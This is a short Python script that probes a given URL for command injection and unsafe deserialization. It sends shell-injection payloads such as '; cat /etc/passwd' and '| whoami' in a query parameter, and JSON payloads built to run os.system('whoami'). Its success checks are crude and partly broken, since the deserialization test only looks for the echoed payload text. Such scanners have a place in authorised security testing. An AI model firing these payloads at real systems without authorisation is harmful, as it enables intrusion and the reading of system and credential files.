import requests
import re
def is_command_injection_vulnerable(url):
    payloads = [
        "; ls", "; whoami", "| ls", "| whoami", "; cat /etc/passwd", "| id", "| uname -a",
        "; ping -c 4 127.0.0.1"
    ]
    vulnerable = False
    for payload in payloads:
        try:
            response = requests.get(url + "?input=" + payload)
            if response.status_code == 200 and any(term in response.text for term in ["root", "uid", "bash"]):
                print(f"Command Injection payload '{payload}' worked.")
                vulnerable = True
        except requests.RequestException as e:
            print(f"Error with payload '{payload}': {e}")
    return vulnerable

def is_unsafe_deserialization(url):
    """
    Tests for unsafe object deserialization by sending potentially dangerous payloads.
    Payloads should be adjusted based on target language/framework.
    """
    payloads = [
        '{"rce": "__import__(\'os\').system(\'whoami\')"}',  # Example for Python
        '{"rce": "System.getProperty(\\"os.name\\")"}'  # Example for Java
    ]
    for payload in payloads:
        response = requests.get(url, data=payload, headers={"Content-Type": "application/json"})
        if "whoami" in response.text or "os.name" in response.text:
            return True  # Indicates unsafe deserialization
    return False
